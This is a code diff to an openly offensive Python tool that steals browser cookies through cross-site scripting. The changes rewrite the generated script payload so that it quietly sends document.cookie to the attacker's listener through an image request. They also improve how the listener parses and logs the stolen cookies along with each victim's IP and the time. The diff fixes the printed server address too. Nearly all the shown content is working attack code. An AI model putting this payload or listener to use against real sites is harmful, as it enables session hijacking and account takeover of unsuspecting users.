@@ -23,13 +23,9 @@ def banner():
 
     """
     print(banner)
-
+   
 def generate_payload(webserver_url):
-    payload = '<script type="text/javascript">'
-    payload += "\n"
-    payload += f"   document.location='{webserver_url}/c='+document.cookie;"
-    payload += "\n"
-    payload += "</script>"
+    payload = f'<script>var i=new Image;i.src="{webserver_url}/"+document.cookie;</script>'
     payload += "\n"
     print(payload)
 
@@ -52,7 +48,10 @@ def parse_cookies(timedate, cookies_string, ip_addr):
         key_value = component.split('=')
         key = urllib.parse.unquote(key_value[0])
         value = urllib.parse.unquote(key_value[1])
-        cookie_data[key] = value
+        if key in cookie_data:
+            cookie_data[key] += ',' + value
+        else:
+            cookie_data[key] = value
     # Save the data to a file
     time_date = timedate
     ip_address = ip_addr
@@ -108,11 +107,11 @@ if __name__ == "__main__":
     with socketserver.TCPServer((args.ip, args.port), MyHttpRequestHandler) as httpd:
         banner()
         print(110 * '=')
-        print(f"[+] Serving on http://{args.ip,}:{args.port}")
+        print(f"[+] Serving on http://{args.ip}:{args.port}")
         print("[+] Time started: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
         #print(f"[+] Saving log to: {httpd.log_filename}")
         print(110 * '=')
         print("[!] The XSS payload should be;\n")
-        generate_payload(f"http://{args.ip,}:{args.port}")
+        generate_payload(f"http://{args.ip}:{args.port}")
         print(110 * '=')
         httpd.serve_forever()
